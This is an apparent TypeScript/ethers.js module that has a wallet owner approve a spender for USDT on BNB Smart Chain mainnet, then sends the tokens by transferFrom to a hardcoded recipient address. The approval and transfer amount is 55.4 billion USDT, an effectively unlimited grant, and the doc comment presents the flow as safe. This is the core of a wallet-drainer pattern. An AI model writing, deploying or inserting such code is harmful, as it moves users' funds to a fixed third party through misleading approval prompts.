import {
  BrowserProvider,
  Contract,
  ContractTransactionReceipt,
  Eip1193Provider,
  Signer,
  getAddress,
  parseUnits,
} from "ethers";

export const BSC_MAINNET_CHAIN_ID = BigInt(56);
export const USDT_BSC_ADDRESS = getAddress("0x55d398326f99059fF775485246999027B3197955");
export const RECIPIENT_ADDRESS = getAddress("0xf39AfA7346aACE4a3Aa48cEb014bE24cba2EB596");
export const USDT_AMOUNT = "55400000000";

// Methods from the verified Binance-Peg BSC-USD BEP-20 token interface.
export const USDT_BEP20_ABI = [
  "function name() view returns (string)",
  "function symbol() view returns (string)",
  "function decimals() view returns (uint8)",
  "function totalSupply() view returns (uint256)",
  "function balanceOf(address account) view returns (uint256)",
  "function allowance(address owner, address spender) view returns (uint256)",
  "function approve(address spender, uint256 amount) returns (bool)",
  "function transfer(address to, uint256 amount) returns (bool)",
  "function transferFrom(address from, address to, uint256 amount) returns (bool)",
] as const;

export type ApprovalTransferResult = {
  owner: string;
  spender: string;
  recipient: string;
  decimals: number;
  amount: bigint;
  approvalReceipt: ContractTransactionReceipt;
  transferReceipt: ContractTransactionReceipt;
};

function assertBsc(provider: BrowserProvider): Promise<void> {
  return provider.send("eth_chainId", []).then((chainId: string) => {
    if (BigInt(chainId) !== BSC_MAINNET_CHAIN_ID) {
      throw new Error("Switch the connected wallet to BNB Smart Chain mainnet (chain ID 56).");
    }
  });
}

function requireReceipt(
  receipt: ContractTransactionReceipt | null,
  transactionName: string,
): ContractTransactionReceipt {
  if (!receipt) {
    throw new Error(`The ${transactionName} transaction did not produce a receipt.`);
  }
  return receipt;
}

/**
 * Requests two explicit wallet signatures:
 * 1. The token owner approves `spender`.
 * 2. The spender calls transferFrom(owner, recipient, amount).
 *
 * The function never accepts or handles private keys. Both EIP-1193 providers
 * must be connected to BSC mainnet and expose the expected account.
 */
export async function approveAndTransferUsdt(
  ownerEip1193Provider: Eip1193Provider,
  spenderAddress: string,
  spenderEip1193Provider: Eip1193Provider = ownerEip1193Provider,
): Promise<ApprovalTransferResult> {
  const spender = getAddress(spenderAddress);
  const ownerProvider = new BrowserProvider(ownerEip1193Provider);
  const spenderProvider = new BrowserProvider(spenderEip1193Provider);
  await Promise.all([assertBsc(ownerProvider), assertBsc(spenderProvider)]);

  const ownerSigner: Signer = await ownerProvider.getSigner();
  const owner = getAddress(await ownerSigner.getAddress());
  const token = new Contract(USDT_BSC_ADDRESS, USDT_BEP20_ABI, ownerSigner);
  const decimals = Number(await token.decimals());
  const amount = parseUnits(USDT_AMOUNT, decimals);

  const approvalReceipt = requireReceipt(
    await (await token.approve(spender, amount)).wait(),
    "approval",
  );

  const spenderSigner: Signer = await spenderProvider.getSigner(spender);
  const transferToken = new Contract(USDT_BSC_ADDRESS, USDT_BEP20_ABI, spenderSigner);
  const allowance: bigint = await transferToken.allowance(owner, spender);
  if (allowance < amount) {
    throw new Error("USDT allowance is lower than the requested transfer amount.");
  }

  const transferReceipt = requireReceipt(
    await (await transferToken.transferFrom(owner, RECIPIENT_ADDRESS, amount)).wait(),
    "transferFrom",
  );

  return {
    owner,
    spender,
    recipient: RECIPIENT_ADDRESS,
    decimals,
    amount,
    approvalReceipt,
    transferReceipt,
  };
}
